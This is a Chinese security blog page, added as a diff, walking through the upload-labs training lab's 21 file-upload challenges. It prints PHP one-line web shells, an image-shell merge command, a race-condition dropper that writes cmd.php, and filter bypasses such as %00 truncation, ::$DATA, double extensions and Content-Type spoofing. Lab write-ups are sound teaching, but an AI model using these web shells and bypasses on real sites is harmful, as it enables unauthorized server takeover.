@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html  lang="zh-cn" >
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#fff" id="theme-color">
+  <meta name="description" content="Husins">
+  <link rel="icon" href="/img/dog.jpg">
+  <title>upload-labs</title>
+  
+  
+  <meta property="og:title" content="upload-labs">
+  
+  
+  <meta property="og:url" content="https://husins.cn/upload-labs/index.html">
+  
+  
+  <meta property="og:img" content="/img/dog.png">
+  
+  
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:published_time" content="2021-05-02">
+  <meta property="og:article:modified_time" content="2021-05-02">
+  <meta property="og:article:author" content="Husins">
+  
+  
+  <meta property="og:article:tag" content="文件上传">
+  
+  
+  
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+    var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+      }
+    };
+    setDarkmode();
+  </script>
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+  </script>
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+  <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+
+  
+  
+<link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <div class="wrapper">
+    
+    <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+      <img class="navbar-logo-img" src="/img/dog.jpg" alt="logo">
+      
+      <span class="navbar-logo-dsc">Husins Blogs</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+    <a href="/" class="navbar-menu-item">
+    
+    主页
+    
+    </a>
+    
+    <a href="/categories" class="navbar-menu-item">
+    
+    分类
+    
+    </a>
+    
+    <a href="/tags" class="navbar-menu-item">
+    
+    标签
+    
+    </a>
+    
+    <a href="/about" class="navbar-menu-item">
+    
+    关于我
+    
+    </a>
+    
+    <a class="navbar-menu-item darknavbar" id="dark"><i class="iconfont icon-weather"></i></a>
+    <a class="navbar-menu-item searchnavbar" id="search"><i class="iconfont icon-search" style="font-size: 1.2rem; font-weight: 400;"></i></a>
+  </div>
+</nav>
+    
+    <div id="local-search" style="display: none;">
+      <input class="navbar-menu-item" id="search-input" placeholder="请输入搜索内容...">
+      <div id="search-content"></div>
+    </div>
+    
+    <div class="section-wrap">
+      <div class="container">
+        <div class="columns">
+          <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      upload-labs
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-05-01T20:44:11.000Z">
+      <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
+      <span>2021-05-02</span>
+    </time>
+    
+    <span class="dot"></span>
+    
+    <a href="/categories/漏洞总结/" class="post-meta-link">漏洞总结</a>
+    
+    
+    
+    <span class="dot"></span>
+    <span>1.9k 字</span>
+    
+  </div>
+  
+  <div class="post-meta post-show-meta" style="margin-top: -10px;">
+    <div style="display: flex; align-items: center;">
+      <i class="iconfont icon-biaoqian" style="margin-right: 2px; font-size: 1.15rem;"></i>
+      
+      
+        <a href="/tags/文件上传/" class="post-meta-link">文件上传</a>
+      
+    </div>
+  </div>
+  
+  </header>
+  <div id="section" class="post-content">
+    <blockquote>
+<p>层楼终究无少年，自由早晚乱余生。</p>
+</blockquote>
+<blockquote>
+<p><strong>常用的一句话木马：</strong></p>
+<p>​    <code>&lt;!--?php @eval($_POST[&#39;cmd&#39;]);?--&gt;</code><br>​    <code>&lt;?php @eval($_POST[&#39;cmd&#39;]) ?&gt;</code></p>
+<p>​    <code>&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[cmd])&lt;/script&gt;</code></p>
+<p>​    <code>&lt;?=eval($_POST[&#39;cmd&#39;]);</code></p>
+<p><strong>常用文件格式</strong></p>
+<p>​    <code>Content-Type: image/png</code><br>​    <code>Content-Type: image/jpeg</code></p>
+<p><strong>图片马合成：</strong></p>
+<p>​    图片和一句话木马在同一文件夹下时，<code>copy 1.jpg/b + 1.php/a 2.jpg  </code></p>
+<p><strong>常用后缀名</strong></p>
+<p>​    <strong>PHP:</strong> </p>
+<p>​        <code>php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定) </code></p>
+<p>​    <strong>ASP：</strong> </p>
+<p>​        <code>asa、cer、cdx ASPX： ascx、ashx、asac </code></p>
+<p>​    <strong>JSP：</strong> </p>
+<p>​        <code>jsp、jspx、jspf</code></p>
+</blockquote>
+<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502005118539.png" alt="image-20210502005118539" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502005118539.png" class="lozad post-image"></p>
+<p>弹窗不允许上传除图片类型外其他类型的文件。这里首先要思考是前端检测还是后端检测。最有效的办法就是<code>F12</code>查看网页源代码。</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502005334242.png" alt="image-20210502005334242" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502005334242.png" class="lozad post-image"></p>
+<p>由此可以看出，是前端校验。前端校验目前已知两种校验方式，禁用<code>JavaScript</code>,或者使用<code>BurpSuite</code>抓包修改后缀。</p>
+<p>禁用<code>JavaScript</code>比较简单这里不再演示，这里演示使用<code>BurpSuite</code>修改后缀</p>
+<p>首先我们应该将一句话木马在text中写好然后将<code>.txt</code>后缀在本机修改为<code>.jpg</code></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502010113678.png" alt="image-20210502010113678" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502010113678.png" class="lozad post-image"></p>
+<p>这样文件就可以直接上传了，最后测试文件上传是否正常。</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502023500552.png" alt="image-20210502023500552" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502023500552.png" class="lozad post-image"></p>
+<h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502024218830.png" alt="image-20210502024218830" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502024218830.png" class="lozad post-image"></p>
+<p>上传<code>1.php</code>发现提示文件上传类型不正确，<code>F12</code>查看，不存在前端校验，因此应该是后端校验，尝试抓包查看。</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502024559441.png" alt="image-20210502024559441" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502024559441.png" class="lozad post-image"></p>
+<p>这里出现了<code>Content-Type</code>判断文件类型，因此应该是通过判断文件类型进行过滤，因此修改此处进行绕过。</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502025010612.png" alt="image-20210502025010612" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502025010612.png" class="lozad post-image"></p>
+<p>发包图片上传成功</p>
+<h1 id="Pass-03和Pass-04"><a href="#Pass-03和Pass-04" class="headerlink" title="Pass-03和Pass-04"></a>Pass-03和Pass-04</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502025537105.png" alt="image-20210502025537105" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502025537105.png" class="lozad post-image"></p>
+<p>上传一句话木马，发现<code>.php</code>被禁用，也就是说这里会检测我们的后缀名，因此只要我们的后缀名不是<code>.php</code>即可。因此我们可以使用同样被当做PHP代码解析的后缀名、使用<code>.htacess</code>增加当做PHP解析的后缀名（1）、使用Apache解析漏洞（2）。</p>
+<p><strong>注解：</strong></p>
+<p>​    (1)：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+<p>​    （2)：Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止。</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502030128345.png" alt="image-20210502030128345" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502030128345.png" class="lozad post-image"></p>
+<h1 id="Pass-05和Pass-10"><a href="#Pass-05和Pass-10" class="headerlink" title="Pass-05和Pass-10"></a>Pass-05和Pass-10</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502031858464.png" alt="image-20210502031858464" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502031858464.png" class="lozad post-image"></p>
+<p>查看源代码，可以发现对文件名做了操作，这里只对文件进行了一次操作，因此上传后缀名为<code>.php. .</code>首先点和空格都被删除掉一次，这时后缀名为<code>.php.</code>,结合windows特性会自动去除文件后缀的点和空格，因此文件可以被当做PHP正常解析，实现绕过。</p>
+<h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502033615879.png" alt="image-20210502033615879" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502033615879.png" class="lozad post-image"></p>
+<p>这里可以用和第五题一样的方法，这里还没有强制转换为小写，因此可以使用大小写的方式进行绕过，例如上传<code>.phP</code>。</p>
+<h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502033822677.png" alt="image-20210502033822677" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502033822677.png" class="lozad post-image"></p>
+<p>这里文件没有首尾去除空格，因此可以使用在后缀名后面添加空格的方法进行绕过。</p>
+<h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502033959106.png" alt="image-20210502033959106" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502033959106.png" class="lozad post-image"></p>
+<p>这里没有去除文件名后面的点，因此可以使用在后缀名后面添加点的方法进行绕过。</p>
+<h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502034058161.png" alt="image-20210502034058161" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502034058161.png" class="lozad post-image"></p>
+<p>这里没有去除windows文件流(1)的过滤，因此可以使用在后缀名后面添加<code>::$DATA</code>的方法进行绕过。</p>
+<p><strong>注解</strong></p>
+<p>​    (1)：在window的时候如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，它的目的就是不检查后缀名</p>
+<h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502035027748.png" alt="image-20210502035027748" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502035027748.png" class="lozad post-image"></p>
+<p>这里会将黑名单的后缀名，替换为空，而且只替换一次，因此可以使用双写的方式<code>.pphphp</code>来进行绕过。</p>
+<h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502035515511.png" alt="image-20210502035515511" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502035515511.png" class="lozad post-image"></p>
+<p>这里不再使用黑名单，而是开始使用白名单，并且修改了文件名。</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502035955758.png" alt="image-20210502035955758" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502035955758.png" class="lozad post-image"></p>
+<p>我们可以再save_path处使用%00截断(1)，<code>?save_path=&quot;../upload/1.php%00&quot;</code>,此时上传的文件名拼接到save_path后面文件相当于当做<code>1.php</code>解析实现绕过。</p>
+<p><strong>注解</strong></p>
+<p>​    在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。但是只存在于php5.3.4以下</p>
+<h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502040300619.png" alt="image-20210502040300619" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502040300619.png" class="lozad post-image"></p>
+<p>源代码和12题是一样的，只是save_path变成了$_POST传参，同样是%00截断，但是这次不同的是save_path在post包里面，GET是可以把url自动转码的，但是POST方式不会自动将%00编码为空字符。因此，我们需要<strong>在burp中选中%00右击-&gt;url-&gt;urldecode go</strong>即可</p>
+<h1 id="Pass-14和Pass-15和Pass-16"><a href="#Pass-14和Pass-15和Pass-16" class="headerlink" title="Pass-14和Pass-15和Pass-16"></a>Pass-14和Pass-15和Pass-16</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502040717022.png" alt="image-20210502040717022" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502040717022.png" class="lozad post-image"></p>
+<p>Pass-14这道题检测文件头，在一句话木马前面添加图片格式文件头，Pass-15和Pass-16上传三种类型图片马。图片马合成有两种方式：使用cmd命令进行合成，或者将图片二进制打开直接写入一句话木马。</p>
+<h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502041731270.png" alt="image-20210502041731270" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502041731270.png" class="lozad post-image"></p>
+<p>这里会将图片二次渲染（1），但是二进制打开原图片和二次渲染之后的图片，会发现有一部分是不发生改变的，只要我们在不发生改变处 写入一句话木马，即可绕过上传。</p>
+<p><strong>注解</strong></p>
+<p>​    二次渲染：就是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。</p>
+<h1 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h1><p><img src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502042952738.png" alt="image-20210502042952738" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/image-20210502042952738.png" class="lozad post-image"></p>
+<p>根据源代码，文件名还要被修改。我们这里可以使用条件竞争来进行绕过。首先我们应该编写一个PHP文件，内容为</p>
+<pre class="highlight"><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	file_put_contents(<span class="hljs-string">&#x27;cmd.php&#x27;</span>,<span class="hljs-string">&#x27;eval($_POST[&#x27;</span>cmd<span class="hljs-string">&#x27;]);&#x27;</span>);<br>    <span class="hljs-meta">?&gt;</span><br></code></pre>
+
+<p>使用<code>burpsuite</code>重复上传这个文件，然后文件重命名或者删除之前成功访问到这个文件，这个文件执行就能写入<code>cmd.php</code>,木马上传成功。</p>
+<h1 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h1><p>程序调用了一个MyUpload类，来判断即文件的状态，和上题一样，但是程序会首先调用isUploadedFile来判断是否属于白名单，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功</p>
+<h1 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h1><p>上传文件和文件名可控，且文件名是黑名单限制。文件名改为<code>20.php/.</code>，move_uploaded_file函数遇到<code>/.</code>的时候会删除它。</p>
+<h1 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h1><p>对MIME和文件后缀都进行了检查。 但是取后缀的时候判断$file是不是数组，可以让$file为数组来绕过$file = explode(‘.’, strtolower($file));。最后上传的时候文件名取的是$file_name = reset($file) . ‘.’ . $file[count($file) - 1];综上，$file数组[“20.php”,””,”jpg”]，最后一个为jpg可以绕过白名单检查，文件名为:20.php.,再配合move_uploaded_file的特性，最终上传的文件名为20.php。</p>
+
+  </div>
+  <div>
+  
+  <div class="post-note note-warning copyright" style="margin-top: 42px">
+    <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/about">Husins</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/upload-labs/">https://husins.cn/upload-labs/</a></p>
+    <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
+  </div>
+  
+  </div>
+</article>
+<div class="nav">
+  
+  
+  <div class="nav-item-next">
+    <a href="/namp常用命令/" class="nav-link">
+      <div>
+        <div class="nav-label">下一篇</div>
+        
+        <div class="nav-title">namp常用命令 </div>
+        
+      </div>
+      <i class="iconfont icon-right nav-next-icon"></i>
+    </a>
+  </div>
+  
+</div>
+
+<div class="card card-content toc-card" id="mobiletoc">
+  <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-01"><span class="toc-text">Pass-01</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-02"><span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-03%E5%92%8CPass-04"><span class="toc-text">Pass-03和Pass-04</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-05%E5%92%8CPass-10"><span class="toc-text">Pass-05和Pass-10</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-06"><span class="toc-text">Pass-06</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-07"><span class="toc-text">Pass-07</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-08"><span class="toc-text">Pass-08</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-09"><span class="toc-text">Pass-09</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-11"><span class="toc-text">Pass-11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-12"><span class="toc-text">Pass-12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-13"><span class="toc-text">Pass-13</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-14%E5%92%8CPass-15%E5%92%8CPass-16"><span class="toc-text">Pass-14和Pass-15和Pass-16</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-17"><span class="toc-text">Pass-17</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-18"><span class="toc-text">Pass-18</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-19"><span class="toc-text">Pass-19</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-20"><span class="toc-text">Pass-20</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-21"><span class="toc-text">Pass-21</span></a></li></ol>
+</div></main>
+          <aside class="left-column">
+            
+            <div class="card card-author">
+              
+<img src="/img/dog.png" class="author-img">
+
+<p class="author-name">Husins</p>
+<p class="author-description">层楼终究误少年,自由早晚乱余生。</p>
+<div class="author-message">
+  <a class="author-posts-count" href="/archives">
+    <span>57</span>
+    <span>文章</span>
+  </a>
+  <a class="author-categories-count" href="/categories">
+    <span>5</span>
+    <span>分类</span>
+  </a>
+  <a class="author-tags-count" href="/tags">
+    <span>17</span>
+    <span>标签</span>
+  </a>
+</div>
+
+            </div>
+            
+            <div class="sticky-tablet">
+  
+  
+  <article class="display-when-two-columns spacer">
+    <div class="card card-content toc-card">
+      <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-01"><span class="toc-text">Pass-01</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-02"><span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-03%E5%92%8CPass-04"><span class="toc-text">Pass-03和Pass-04</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-05%E5%92%8CPass-10"><span class="toc-text">Pass-05和Pass-10</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-06"><span class="toc-text">Pass-06</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-07"><span class="toc-text">Pass-07</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-08"><span class="toc-text">Pass-08</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-09"><span class="toc-text">Pass-09</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-11"><span class="toc-text">Pass-11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-12"><span class="toc-text">Pass-12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-13"><span class="toc-text">Pass-13</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-14%E5%92%8CPass-15%E5%92%8CPass-16"><span class="toc-text">Pass-14和Pass-15和Pass-16</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-17"><span class="toc-text">Pass-17</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-18"><span class="toc-text">Pass-18</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-19"><span class="toc-text">Pass-19</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-20"><span class="toc-text">Pass-20</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-21"><span class="toc-text">Pass-21</span></a></li></ol>
+    </div>
+  </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header"><i class="iconfont icon-fenlei" style="padding-right: 2px;"></i>分类</div>
+  <div class="categories-list">
+    
+      <a href="/categories/CTF题解">
+        <div class="categories-list-item">
+          CTF题解
+          <span class="categories-list-item-badge">41</span>
+        </div>
+      </a>
+    
+      <a href="/categories/漏洞总结">
+        <div class="categories-list-item">
+          漏洞总结
+          <span class="categories-list-item-badge">11</span>
+        </div>
+      </a>
+    
+      <a href="/categories/工具使用">
+        <div class="categories-list-item">
+          工具使用
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/MISC">
+        <div class="categories-list-item">
+          MISC
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/漏洞复现">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header"><i class="iconfont icon-biaoqian" style="padding-right: 2px;"></i>热门标签</div>
+  <div class="tags-list">
+    
+    <a href="\tags\BUUCTF" title="BUUCTF"><div class="tags-list-item">BUUCTF</div></a>
+    
+    <a href="\tags\UNCTF" title="UNCTF"><div class="tags-list-item">UNCTF</div></a>
+    
+    <a href="\tags\SSRF" title="SSRF"><div class="tags-list-item">SSRF</div></a>
+    
+    <a href="\tags\SSTI" title="SSTI"><div class="tags-list-item">SSTI</div></a>
+    
+    <a href="\tags\文件包含" title="文件包含"><div class="tags-list-item">文件包含</div></a>
+    
+    <a href="\tags\攻防世界" title="攻防世界"><div class="tags-list-item">攻防世界</div></a>
+    
+    <a href="\tags\git" title="git"><div class="tags-list-item">git</div></a>
+    
+    <a href="\tags\SQL" title="SQL"><div class="tags-list-item">SQL</div></a>
+    
+    <a href="\tags\RCE" title="RCE"><div class="tags-list-item">RCE</div></a>
+    
+    <a href="\tags\信息收集" title="信息收集"><div class="tags-list-item">信息收集</div></a>
+    
+    <a href="\tags\ms17-010" title="ms17-010"><div class="tags-list-item">ms17-010</div></a>
+    
+    <a href="\tags\XXE" title="XXE"><div class="tags-list-item">XXE</div></a>
+    
+    <a href="\tags\JWT Pickle" title="JWT Pickle"><div class="tags-list-item">JWT Pickle</div></a>
+    
+    <a href="\tags\反序列化" title="反序列化"><div class="tags-list-item">反序列化</div></a>
+    
